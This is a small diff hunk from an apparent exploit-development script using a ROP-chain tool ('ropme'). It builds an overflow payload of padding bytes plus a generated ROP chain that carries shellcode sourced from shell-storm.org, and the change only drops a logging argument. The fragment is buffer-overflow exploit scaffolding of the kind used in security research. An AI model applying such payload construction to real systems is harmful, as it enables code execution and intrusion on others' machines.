@@ -22,7 +22,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 
 files = [(filename, 0)]
 goal_resolver = goal.create_from_arguments(files, [], [["shellcode_hex", binascii.hexlify(shellcode)]])
-rop = ropme.rop(files, goal_resolver, logging.CRITICAL)
+rop = ropme.rop(files, goal_resolver)
 
 payload = 'A'*512 + 'B'*8 + rop
 
